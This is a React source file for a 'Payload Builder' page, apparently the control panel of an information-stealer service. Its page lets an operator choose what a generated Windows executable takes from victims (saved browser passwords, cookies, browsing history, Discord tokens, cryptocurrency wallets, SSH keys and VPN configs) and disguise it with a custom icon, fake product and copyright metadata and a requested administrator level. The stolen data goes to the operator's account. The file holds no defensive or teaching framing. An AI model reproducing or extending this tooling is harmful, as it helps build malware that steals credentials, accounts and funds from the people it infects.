import React, { useState, useEffect } from 'react';
import {
    Box,
    Paper,
    Typography,
    FormControlLabel,
    Checkbox,
    Button,
    Grid,
    Card,
    CardContent,
    Alert,
    LinearProgress,
    Chip,
    TextField,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Divider,
    MenuItem,
    Select,
    FormControl,
    InputLabel
} from '@mui/material';
import { Download as DownloadIcon, Build as BuildIcon, ExpandMore as ExpandMoreIcon, Image as ImageIcon } from '@mui/icons-material';

function PayloadBuilderPage() {
    const [selectedFeatures, setSelectedFeatures] = useState({
        location: true,
        systemInfo: true,
        runningProcesses: true,
        installedApps: true,
        browserCookies: true,
        savedPasswords: true,
        browserHistory: true,
        discordTokens: true,
        cryptoWallets: true,
        importantFiles: true
    });

    const [isGenerating, setIsGenerating] = useState(false);
    const [error, setError] = useState('');
    const [success, setSuccess] = useState('');
    const [userInfo, setUserInfo] = useState(null);
    const [outputName, setOutputName] = useState('');
    const [iconFile, setIconFile] = useState(null);
    const [fileMetadata, setFileMetadata] = useState({
        description: '',
        fileDescription: '',
        fileVersion: '',
        productName: '',
        productVersion: '',
        copyright: '',
        requestedExecutionLevel: ''
    });

    useEffect(() => {
        // Get current user info
        const storedUserInfo = localStorage.getItem('userInfo');
        if (storedUserInfo) {
            try {
                const parsed = JSON.parse(storedUserInfo);
                setUserInfo(parsed);
            } catch (e) {
                console.error('Error parsing user info:', e);
            }
        }
    }, []);

    const features = [
        {
            key: 'location',
            title: 'Location Information',
            description: 'Collects IP address, country, city, and coordinates',
            category: 'Basic'
        },
        {
            key: 'systemInfo',
            title: 'System Information',
            description: 'Collects OS version, hardware specs, and system details',
            category: 'Basic'
        },
        {
            key: 'runningProcesses',
            title: 'Running Processes',
            description: 'Lists all currently running applications and processes',
            category: 'System'
        },
        {
            key: 'installedApps',
            title: 'Installed Applications',
            description: 'Scans for installed software and applications',
            category: 'System'
        },
        {
            key: 'browserCookies',
            title: 'Browser Cookies',
            description: 'Extracts cookies from Chrome, Edge, Firefox, and other browsers',
            category: 'Browser'
        },
        {
            key: 'savedPasswords',
            title: 'Saved Passwords',
            description: 'Extracts saved login credentials from browsers',
            category: 'Browser'
        },
        {
            key: 'browserHistory',
            title: 'Browser History',
            description: 'Collects browsing history from all installed browsers',
            category: 'Browser'
        },
        {
            key: 'discordTokens',
            title: 'Discord Tokens',
            description: 'Extracts Discord authentication tokens and user data',
            category: 'Applications'
        },
        {
            key: 'cryptoWallets',
            title: 'Crypto Wallets',
            description: 'Scans for cryptocurrency wallet files and data',
            category: 'Applications'
        },
        {
            key: 'importantFiles',
            title: 'Important Files',
            description: 'Collects configuration files, SSH keys, VPN configs, and other sensitive files',
            category: 'Files'
        }
    ];

    const categories = ['Basic', 'System', 'Browser', 'Applications', 'Files'];

    const handleFeatureChange = (featureKey) => (event) => {
        setSelectedFeatures(prev => ({
            ...prev,
            [featureKey]: event.target.checked
        }));
    };

    const handleSelectAll = (category, select) => {
        const categoryFeatures = features.filter(f => f.category === category);
        const newState = { ...selectedFeatures };
        categoryFeatures.forEach(feature => {
            newState[feature.key] = select;
        });
        setSelectedFeatures(newState);
    };

    const handleMetadataChange = (field) => (event) => {
        setFileMetadata(prev => ({
            ...prev,
            [field]: event.target.value
        }));
    };

    const handleIconChange = (event) => {
        const file = event.target.files[0];
        if (file) {
            if (!file.name.toLowerCase().endsWith('.ico')) {
                setError('Only .ico files are allowed');
                return;
            }
            setIconFile(file);
            setError('');
        }
    };

    const handleGeneratePayload = async () => {
        setIsGenerating(true);
        setError('');
        setSuccess('');

        try {
            const token = localStorage.getItem('authToken');
            if (!token) {
                throw new Error('Not authenticated');
            }

            // Generate filename - use custom name or default
            const finalOutputName = outputName.trim() || `payload_${userInfo?.username || 'unknown'}_${Date.now()}`;

            // Use FormData to support file uploads
            const formData = new FormData();
            formData.append('features', JSON.stringify(selectedFeatures));
            formData.append('user', userInfo?.username || '');
            formData.append('outputName', finalOutputName);
            
            // Add file metadata
            if (fileMetadata.description) formData.append('description', fileMetadata.description);
            if (fileMetadata.fileDescription) formData.append('fileDescription', fileMetadata.fileDescription);
            if (fileMetadata.fileVersion) formData.append('fileVersion', fileMetadata.fileVersion);
            if (fileMetadata.productName) formData.append('productName', fileMetadata.productName);
            if (fileMetadata.productVersion) formData.append('productVersion', fileMetadata.productVersion);
            if (fileMetadata.copyright) formData.append('copyright', fileMetadata.copyright);
            if (fileMetadata.requestedExecutionLevel) formData.append('requestedExecutionLevel', fileMetadata.requestedExecutionLevel);
            
            // Add icon file if selected
            if (iconFile) {
                formData.append('icon', iconFile);
            }

            const response = await fetch('/api/payloads/generate', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`
                    // Don't set Content-Type - let browser set it with boundary for FormData
                },
                body: formData
            });

            if (!response.ok) {
                const errorData = await response.json().catch(() => ({ message: 'Server error' }));
                throw new Error(errorData.message || `Server error: ${response.status}`);
            }

            // Create download link
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            // Use the custom name or default, ensure .exe extension
            let downloadName = finalOutputName;
            if (!downloadName.toLowerCase().endsWith('.exe')) {
                downloadName += '.exe';
            }
            a.download = downloadName;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);

            setSuccess('Payload generated and downloaded successfully!');
        } catch (err) {
            console.error('Error generating payload:', err);
            setError(err.message || 'Failed to generate payload');
        } finally {
            setIsGenerating(false);
        }
    };

    const getSelectedCount = (category) => {
        return features.filter(f => f.category === category && selectedFeatures[f.key]).length;
    };

    const getTotalSelected = () => {
        return Object.values(selectedFeatures).filter(Boolean).length;
    };

    return (
        <Box sx={{ p: 3 }}>
            <Typography variant="h4" gutterBottom sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                <BuildIcon />
                Payload Builder
            </Typography>

            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                Create custom payloads that will collect data and send it to your account.
                {userInfo?.username && (
                    <span> Logs will be attributed to: <strong>{userInfo.username}</strong></span>
                )}
            </Typography>

            {error && (
                <Alert severity="error" sx={{ mb: 2 }}>
                    {error}
                </Alert>
            )}

            {success && (
                <Alert severity="success" sx={{ mb: 2 }}>
                    {success}
                </Alert>
            )}

            <Grid container spacing={3}>
                {categories.map(category => (
                    <Grid item xs={12} md={6} key={category}>
                        <Card>
                            <CardContent>
                                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                                    <Typography variant="h6">{category}</Typography>
                                    <Box sx={{ display: 'flex', gap: 1 }}>
                                        <Button
                                            size="small"
                                            onClick={() => handleSelectAll(category, true)}
                                            disabled={getSelectedCount(category) === features.filter(f => f.category === category).length}
                                        >
                                            Select All
                                        </Button>
                                        <Button
                                            size="small"
                                            onClick={() => handleSelectAll(category, false)}
                                            disabled={getSelectedCount(category) === 0}
                                        >
                                            Deselect All
                                        </Button>
                                        <Chip
                                            label={`${getSelectedCount(category)}/${features.filter(f => f.category === category).length}`}
                                            size="small"
                                            color={getSelectedCount(category) > 0 ? "primary" : "default"}
                                        />
                                    </Box>
                                </Box>

                                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
                                    {features.filter(f => f.category === category).map(feature => (
                                        <FormControlLabel
                                            key={feature.key}
                                            control={
                                                <Checkbox
                                                    checked={selectedFeatures[feature.key]}
                                                    onChange={handleFeatureChange(feature.key)}
                                                    color="primary"
                                                />
                                            }
                                            label={
                                                <Box>
                                                    <Typography variant="body2" fontWeight="medium">
                                                        {feature.title}
                                                    </Typography>
                                                    <Typography variant="caption" color="text.secondary">
                                                        {feature.description}
                                                    </Typography>
                                                </Box>
                                            }
                                        />
                                    ))}
                                </Box>
                            </CardContent>
                        </Card>
                    </Grid>
                ))}
            </Grid>

            <Paper sx={{ p: 3, mt: 3, bgcolor: 'background.paper' }}>
                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 2 }}>
                    <Box sx={{ flex: 1, minWidth: 250 }}>
                        <Typography variant="h6" gutterBottom>
                            Payload Summary
                        </Typography>
                        <Typography variant="body2" color="text.secondary">
                            {getTotalSelected()} out of {Object.keys(selectedFeatures).length} features selected
                        </Typography>
                        {userInfo?.username && (
                            <Typography variant="body2" color="text.secondary">
                                Target Account: <strong>{userInfo.username}</strong>
                            </Typography>
                        )}
                    </Box>

                    <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, alignItems: 'flex-end' }}>
                        <TextField
                            label="Output Filename"
                            placeholder={`payload_${userInfo?.username || 'unknown'}_${Date.now()}`}
                            value={outputName}
                            onChange={(e) => setOutputName(e.target.value)}
                            size="small"
                            sx={{ minWidth: 280 }}
                            helperText=".exe will be added automatically if not specified"
                            InputProps={{
                                endAdornment: <Typography variant="caption" color="text.secondary">.exe</Typography>
                            }}
                        />
                        <Button
                            variant="contained"
                            startIcon={<DownloadIcon />}
                            onClick={handleGeneratePayload}
                            disabled={isGenerating || getTotalSelected() === 0}
                            size="large"
                            sx={{ minWidth: 200 }}
                        >
                            {isGenerating ? 'Generating...' : 'Generate Payload'}
                        </Button>
                    </Box>
                </Box>

                <Divider sx={{ my: 3 }} />

                <Accordion>
                    <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                            <ImageIcon />
                            <Typography variant="h6">Icon & File Properties</Typography>
                        </Box>
                    </AccordionSummary>
                    <AccordionDetails>
                        <Grid container spacing={2}>
                            <Grid item xs={12}>
                                <Typography variant="subtitle2" gutterBottom>
                                    Custom Icon (.ico file)
                                </Typography>
                                <Button
                                    variant="outlined"
                                    component="label"
                                    size="small"
                                    sx={{ mb: 2 }}
                                >
                                    {iconFile ? iconFile.name : 'Select Icon File'}
                                    <input
                                        type="file"
                                        hidden
                                        accept=".ico"
                                        onChange={handleIconChange}
                                    />
                                </Button>
                                {iconFile && (
                                    <Typography variant="caption" color="text.secondary" sx={{ ml: 1 }}>
                                        {iconFile.name}
                                    </Typography>
                                )}
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <TextField
                                    fullWidth
                                    label="Description"
                                    value={fileMetadata.description}
                                    onChange={handleMetadataChange('description')}
                                    size="small"
                                    helperText="File description shown in properties"
                                />
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <TextField
                                    fullWidth
                                    label="File Description"
                                    value={fileMetadata.fileDescription}
                                    onChange={handleMetadataChange('fileDescription')}
                                    size="small"
                                    helperText="Detailed file description"
                                />
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <TextField
                                    fullWidth
                                    label="File Version"
                                    value={fileMetadata.fileVersion}
                                    onChange={handleMetadataChange('fileVersion')}
                                    size="small"
                                    placeholder="1.0.0.0"
                                    helperText="Format: major.minor.build.revision"
                                />
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <TextField
                                    fullWidth
                                    label="Product Name"
                                    value={fileMetadata.productName}
                                    onChange={handleMetadataChange('productName')}
                                    size="small"
                                    helperText="Product name shown in properties"
                                />
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <TextField
                                    fullWidth
                                    label="Product Version"
                                    value={fileMetadata.productVersion}
                                    onChange={handleMetadataChange('productVersion')}
                                    size="small"
                                    placeholder="1.0.0.0"
                                    helperText="Product version number"
                                />
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <TextField
                                    fullWidth
                                    label="Copyright"
                                    value={fileMetadata.copyright}
                                    onChange={handleMetadataChange('copyright')}
                                    size="small"
                                    placeholder="Copyright © 2025"
                                    helperText="Copyright information"
                                />
                            </Grid>
                            
                            <Grid item xs={12} md={6}>
                                <FormControl fullWidth size="small">
                                    <InputLabel>Execution Level</InputLabel>
                                    <Select
                                        value={fileMetadata.requestedExecutionLevel}
                                        label="Execution Level"
                                        onChange={(e) => setFileMetadata(prev => ({ ...prev, requestedExecutionLevel: e.target.value }))}
                                    >
                                        <MenuItem value="">Default (asInvoker)</MenuItem>
                                        <MenuItem value="asInvoker">asInvoker - Same privileges as parent</MenuItem>
                                        <MenuItem value="highestAvailable">highestAvailable - Highest available privileges</MenuItem>
                                        <MenuItem value="requireAdministrator">requireAdministrator - Requires admin privileges</MenuItem>
                                    </Select>
                                    <Typography variant="caption" color="text.secondary" sx={{ mt: 0.5, display: 'block' }}>
                                        UAC execution level for the executable
                                    </Typography>
                                </FormControl>
                            </Grid>
                        </Grid>
                    </AccordionDetails>
                </Accordion>

                {isGenerating && (
                    <Box sx={{ mt: 2 }}>
                        <LinearProgress />
                        <Typography variant="body2" color="text.secondary" sx={{ mt: 1 }}>
                            Building custom payload executable...
                        </Typography>
                    </Box>
                )}
            </Paper>
        </Box>
    );
}

export default PayloadBuilderPage;
